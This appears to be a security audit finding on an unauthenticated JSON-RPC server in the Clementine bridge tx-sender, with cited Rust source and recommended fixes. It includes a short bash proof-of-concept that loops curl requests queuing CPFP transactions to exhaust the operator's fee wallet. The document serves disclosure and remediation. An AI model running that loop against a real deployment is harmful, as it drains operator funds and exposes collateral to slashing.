### Title
Unauthenticated tx-sender JSON-RPC Server Allows Any Network Peer to Queue Arbitrary Transactions with CPFP Fee Bumping, Draining Operator Fee Wallet - (`crates/clementine-tx-sender/src/jsonrpc/server.rs`)

### Summary

The tx-sender JSON-RPC server (`send_tx`, `send_citrea_tx`) is started with no authentication layer of any kind. Any process or network peer that can reach the bind address can call `send_tx` with `fee_paying_type: CPFP`, causing the tx-sender to create CPFP child transactions that spend UTXOs from the operator's Bitcoin fee wallet. Exhausting those UTXOs prevents legitimate bridge transactions (kickoff, payout, challenge, reimbursement) from being confirmed, which can cause timelock expiry and operator collateral loss.

### Finding Description

`start_jsonrpc_server` builds a plain `jsonrpsee` HTTP server with no middleware, no token check, no IP allowlist, and no TLS:

```rust
let server: Server = ServerBuilder::default()
    .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
    .build(bind_addr)
    .await
    ...
``` [1](#0-0) 

The two registered methods accept any caller:

```rust
module.register_async_method("send_tx", |params, client, _| async move { ... })
``` [2](#0-1) 

```rust
module.register_async_method("send_citrea_tx", |params, client, _| async move { ... })
``` [3](#0-2) 

The bind address is operator-configured and explicitly permits `0.0.0.0`:

```rust
if bind != "127.0.0.1" && bind != "0.0.0.0" {
    return Err(...);
}
``` [4](#0-3) 

The run script defaults to `TX_SENDER_JSONRPC_BIND=127.0.0.1` but documents `0.0.0.0` as a valid value: [5](#0-4) 

Contrast this with the gRPC servers, which enforce mTLS + the `OnlyAggregatorAndSelf` interceptor when `client_verification = true`: [6](#0-5) 

The JSON-RPC server has no equivalent guard.

### Impact Explanation

`InsertTryToSendParams` lets the caller set `fee_paying_type: CPFP`. When the tx-sender loop processes a CPFP entry it creates a child transaction spending a UTXO from the operator's Bitcoin fee wallet: [7](#0-6) 

An attacker who submits many transactions with `fee_paying_type: CPFP` causes the tx-sender to repeatedly attempt to create CPFP children, consuming fee-paying UTXOs. Once those UTXOs are exhausted:

- Legitimate bridge transactions (Round, ReadyToReimburse, Kickoff, Payout, WatchtowerChallenge, AssertTimeout) cannot be fee-bumped and may not confirm before their timelocks expire.
- Timelock expiry on kickoff or challenge transactions can result in operator collateral being slashable or permanently locked.

The impact gate explicitly includes "loss of tx-sender-managed balances" and "slashable exposure of operator collateral."

### Likelihood Explanation

- The JSON-RPC server is an opt-in feature (`json-rpc` cargo feature + `TX_SENDER_JSONRPC_PORT` env var), but it is the documented standalone deployment path and is exercised in the smoke-test script.
- When `TX_SENDER_JSONRPC_BIND=0.0.0.0`, any network peer can reach it with a plain HTTP POST — no TLS, no certificate, no token.
- Even at the default `127.0.0.1`, any co-located process (container escape, shared host, compromised dependency) can call it.
- The attacker needs no bridge knowledge: a loop of `{"method":"send_tx","params":[{"signed_tx_hex":"...","fee_paying_type":"CPFP",...}]}` suffices.

### Recommendation

1. **Add an authentication layer** to `start_jsonrpc_server` — at minimum a static bearer token checked on every request, or restrict to a Unix-domain socket with filesystem permissions.
2. **Validate the caller** before accepting `fee_paying_type: CPFP`; only the operator's own internal components should be permitted to submit CPFP-eligible transactions.
3. **Rate-limit** the number of pending CPFP entries per caller or globally to bound fee-wallet exposure.
4. **Enforce `127.0.0.1`-only** as the default and require explicit opt-in with a documented security warning for `0.0.0.0`.

### Proof of Concept

```bash
# Attacker on the same host (or network if BIND=0.0.0.0)
# Craft any syntactically valid signed tx hex (does not need to be mineable)
RAW_TX_HEX="<hex of any valid signed tx>"

for i in $(seq 1 500); do
  curl -s -H 'content-type: application/json' \
    --data "{\"jsonrpc\":\"2.0\",\"id\":$i,\"method\":\"send_tx\",\"params\":[{
      \"tx_metadata\": null,
      \"signed_tx_hex\": \"$RAW_TX_HEX\",
      \"fee_paying_type\": \"CPFP\",
      \"rbf_signing_info\": null,
      \"cancel_outpoints\": [],
      \"cancel_txids\": [],
      \"activate_txids\": [],
      \"activate_outpoints\": []
    }]}" \
    http://127.0.0.1:3030
done
```

Each accepted entry causes the tx-sender loop to attempt a CPFP child transaction spending from the operator's fee wallet. After enough iterations the fee wallet is exhausted and legitimate bridge transactions stall, exposing operator collateral to timelock-based slashing. [8](#0-7) [9](#0-8) [10](#0-9)

### Citations

**File:** crates/clementine-tx-sender/src/jsonrpc/server.rs (L42-111)
```rust
pub async fn start_jsonrpc_server(
    tx_sender_client: TxSenderClient,
    bind_addr: SocketAddr,
) -> Result<TxSenderJsonRpcServer, BridgeError> {
    let server: Server = ServerBuilder::default()
        .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
        .build(bind_addr)
        .await
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let local_addr = server
        .local_addr()
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let mut module = RpcModule::new(tx_sender_client.clone());
    module
        .register_async_method("send_tx", |params, client, _| async move {
            let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;

            let raw_tx = hex::decode(&req.signed_tx_hex).map_err(jsonrpc_err)?;
            let signed_tx: Transaction = consensus::deserialize(&raw_tx).map_err(jsonrpc_err)?;

            let mut dbtx = client.db.begin_transaction().await.map_err(jsonrpc_err)?;

            let try_to_send_id = client
                .insert_try_to_send(
                    &mut dbtx,
                    req.tx_metadata,
                    &signed_tx,
                    req.fee_paying_type,
                    req.rbf_signing_info,
                    &req.cancel_outpoints,
                    &req.cancel_txids,
                    &req.activate_txids,
                    &req.activate_outpoints,
                )
                .await
                .map_err(jsonrpc_err)?;

            client
                .db
                .commit_transaction(dbtx)
                .await
                .map_err(jsonrpc_err)?;

            Ok::<u32, ErrorObjectOwned>(try_to_send_id)
        })
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    // Citrea-specific RPCs.
    #[cfg(feature = "citrea")]
    {
        module
            .register_async_method("send_citrea_tx", |params, client, _| async move {
                let req: InsertCitreaRawTxParams = params.one().map_err(jsonrpc_err)?;

                let insertion_id = client
                    .send_citrea_tx(req.citrea_tx_request)
                    .await
                    .map_err(jsonrpc_err)?;

                Ok::<i64, ErrorObjectOwned>(insertion_id)
            })
            .map_err(|e| BridgeError::Eyre(e.into()))?;
    }

    let handle = server.start(module);

    Ok(TxSenderJsonRpcServer { handle, local_addr })
}
```

**File:** crates/clementine-tx-sender/src/config.rs (L30-35)
```rust
pub struct TxSenderJsonRpcConfig {
    /// Bind address for the JSON-RPC server. Restricted to 127.0.0.1 or 0.0.0.0.
    pub bind: String,
    /// TCP port for the JSON-RPC server.
    pub port: u16,
}
```

**File:** crates/clementine-tx-sender/src/config.rs (L203-208)
```rust
                if bind != "127.0.0.1" && bind != "0.0.0.0" {
                    return Err(BridgeError::EnvVarMalformed(
                        "TX_SENDER_JSONRPC_BIND",
                        "bind must be either 127.0.0.1 or 0.0.0.0".to_string(),
                    ));
                }
```

**File:** crates/clementine-tx-sender/run.sh (L34-39)
```shellscript
# Enable JSON-RPC server.
export TX_SENDER_JSONRPC_BIND="${TX_SENDER_JSONRPC_BIND:-127.0.0.1}"
export TX_SENDER_JSONRPC_PORT="${TX_SENDER_JSONRPC_PORT:-3030}"
export TX_SENDER_POLL_DELAY_MS="${TX_SENDER_POLL_DELAY_MS:-500}"
export TX_SENDER_FINALITY_DEPTH="${TX_SENDER_FINALITY_DEPTH:-1}"
export TX_SENDER_INCLUDE_UNSAFE="${TX_SENDER_INCLUDE_UNSAFE:-true}"
```

**File:** core/src/servers.rs (L106-139)
```rust
            let tls_config = if config.client_verification {
                ServerTlsConfig::new()
                    .identity(server_identity)
                    .client_ca_root(client_ca)
            } else {
                ServerTlsConfig::new().identity(server_identity)
            };

            let service = InterceptedService::new(
                service,
                if config.client_verification {
                    let client_cert = CertificateDer::from_pem_file(&config.client_cert_path)
                        .wrap_err(format!(
                            "Failed to read client certificate from {}",
                            config.client_cert_path.display()
                        ))?
                        .to_owned();

                    let aggregator_cert =
                        CertificateDer::from_pem_file(&config.aggregator_cert_path)
                            .wrap_err(format!(
                                "Failed to read aggregator certificate from {}",
                                config.aggregator_cert_path.display()
                            ))?
                            .to_owned();

                    OnlyAggregatorAndSelf {
                        aggregator_cert,
                        our_cert: client_cert,
                    }
                } else {
                    Noop
                },
            );
```

**File:** crates/clementine-tx-sender/src/client.rs (L59-70)
```rust
    pub async fn insert_try_to_send(
        &self,
        dbtx: &mut crate::TxSenderTransaction,
        tx_metadata: Option<TxMetadata>,
        signed_tx: &Transaction,
        fee_paying_type: FeePayingType,
        rbf_signing_info: Option<RbfSigningInfo>,
        cancel_outpoints: &[OutPoint],
        cancel_txids: &[Txid],
        activate_txids: &[ActivatedWithTxid],
        activate_outpoints: &[ActivatedWithOutpoint],
    ) -> Result<u32, BridgeError> {
```
